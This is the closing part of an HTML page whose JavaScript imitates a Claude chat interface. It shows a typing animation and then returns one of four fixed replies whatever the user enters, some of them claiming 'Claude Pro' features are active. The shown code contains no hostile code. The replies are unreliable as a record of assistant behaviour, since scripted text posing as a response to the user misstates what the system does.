})();

// ================================================
// CHAT MODULE
// ================================================
(function(){
  var claudeMark = '<svg viewBox="0 0 24 24"><path d="M12 1l2.6 7.9H22l-6.5 4.7 2.5 7.9L12 16.8 5.9 21.5l2.5-7.9L2 8.9h7.4z"/></svg>';
  var replyIndex = 0;
  var replies = [
    '<p>Sure! With Claude Pro you get priority access and higher usage limits. How can I help today?</p>',
    '<p>Good question. Let me break this down step by step for you.</p><p>As a Pro subscriber, you also get extended thinking and priority access during busy periods.</p>',
    '<p>Absolutely, I can help with that. What specific aspects would you like me to focus on?</p>',
    '<p>Working on that now with full Pro capabilities enabled.</p>'
  ];

  function escapeHtml(t){
    return t.replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;');
  }

  function scrollChat(){
    var c = document.getElementById('chat');
    setTimeout(function(){ c.scrollTop = c.scrollHeight; }, 60);
  }

  function actionsHtml(){
    return '<div class="ma">' +
      '<button class="mab" onclick="window.copyMsg(this)"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><rect width="14" height="14" x="8" y="8" rx="2"/><path d="M4 16c-1.1 0-2-.9-2-2V4c0-1.1.9-2 2-2h10c1.1 0 2 .9 2 2"/></svg><span>Copy</span></button>' +
      '<button class="mab" onclick="window.toggleVote(this,\'up\')"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M7 10v12"/><path d="M15 5.88 14 10h5.83a2 2 0 0 1 1.92 2.56l-2.33 8A2 2 0 0 1 17.5 22H4a2 2 0 0 1-2-2v-8a2 2 0 0 1 2-2h2.76a2 2 0 0 0 1.79-1.11L12 2a3.13 3.13 0 0 1 3 3.88Z"/></svg></button>' +
      '<button class="mab" onclick="window.toggleVote(this,\'down\')"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M17 14V2"/><path d="M9 18.12 10 14H4.17a2 2 0 0 1-1.92-2.56l2.33-8A2 2 0 0 1 6.5 2H20a2 2 0 0 1 2 2v8a2 2 0 0 1-2 2h-2.76a2 2 0 0 0-1.79 1.11L12 22a3.13 3.13 0 0 1-3-3.88Z"/></svg></button>' +
      '<button class="mab" onclick="window.retryReply(this)"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M3 12a9 9 0 1 0 9-9 9.75 9.75 0 0 0-6.74 2.74L3 8"/><path d="M3 3v5h5"/></svg></button>' +
    '</div>';
  }

  window.newChat = function(){
    document.getElementById('ws').style.display = 'block';
    document.getElementById('cm').style.display = 'none';
    document.getElementById('mg').innerHTML = '';
  };

  window.qs = function(text){
    document.getElementById('ti').value = text;
    window.send();
  };

  window.ar = function(el){
    el.style.height = 'auto';
    el.style.height = Math.min(el.scrollHeight, 200) + 'px';
  };

  window.hk = function(ev){
    if(ev.key === 'Enter' && !ev.shiftKey){
      ev.preventDefault();
      window.send();
    }
  };

  window.send = function(){
    var ti = document.getElementById('ti');
    var text = ti.value.trim();
    if(!text) return;
    document.getElementById('ws').style.display = 'none';
    document.getElementById('cm').style.display = 'block';
    var mg = document.getElementById('mg');
    var userDiv = document.createElement('div');
    userDiv.className = 'umw';
    userDiv.innerHTML = '<div class="ubbl">' + escapeHtml(text) + '</div>';
    mg.appendChild(userDiv);
    ti.value = '';
    ti.style.height = 'auto';
    scrollChat();
    var typingDiv = document.createElement('div');
    typingDiv.className = 'amw';
    typingDiv.id = 'typingRow';
    typingDiv.innerHTML = '<div class="aav">' + claudeMark + '</div><div class="ac"><div class="dots"><span></span><span></span><span></span></div></div>';
    mg.appendChild(typingDiv);
    scrollChat();
    setTimeout(function(){
      var t = document.getElementById('typingRow');
      if(t) t.remove();
      var aDiv = document.createElement('div');
      aDiv.className = 'amw';
      aDiv.innerHTML = '<div class="aav">' + claudeMark + '</div><div class="ac">' + replies[replyIndex % replies.length] + actionsHtml() + '</div>';
      replyIndex++;
      mg.appendChild(aDiv);
      scrollChat();
    }, 1100 + Math.random() * 700);
  };

  window.copyMsg = function(btn){
    var ac = btn.closest('.ac');
    if(!ac) return;
    var clone = ac.cloneNode(true);
    var actions = clone.querySelector('.ma');
    if(actions) actions.remove();
    var text = clone.innerText || clone.textContent || '';
    function showCopied(){
      var span = btn.querySelector('span');
      var original = span ? span.textContent : '';
      btn.classList.add('copied');
      if(span) span.textContent = 'Copied';
      setTimeout(function(){
        btn.classList.remove('copied');
        if(span) span.textContent = original;
      }, 1300);
    }
    try{
      if(navigator.clipboard && navigator.clipboard.writeText){
        navigator.clipboard.writeText(text).then(showCopied).catch(function(){
          fallbackCopy(text); showCopied();
        });
      } else {
        fallbackCopy(text); showCopied();
      }
    } catch(e){
      try{ fallbackCopy(text); showCopied(); }catch(e2){}
    }
  };

  function fallbackCopy(text){
    var ta = document.createElement('textarea');
    ta.value = text;
    ta.style.position = 'fixed';
    ta.style.opacity = '0';
    document.body.appendChild(ta);
    ta.select();
    try{ document.execCommand('copy'); } catch(e){}
    document.body.removeChild(ta);
  }

  window.toggleVote = function(btn, kind){
    var row = btn.parentElement;
    var siblings = row.querySelectorAll('.mab');
    siblings.forEach(function(s){ if(s !== btn) s.classList.remove('on'); });
    btn.classList.toggle('on');
  };

  window.retryReply = function(btn){
    var ac = btn.closest('.ac');
    if(!ac) return;
    var newText = replies[replyIndex % replies.length];
    replyIndex++;
    ac.innerHTML = '<div class="dots"><span></span><span></span><span></span></div>';
    setTimeout(function(){
      ac.innerHTML = newText + actionsHtml();
    }, 700);
  };
})();
</script>
</body>
</html>
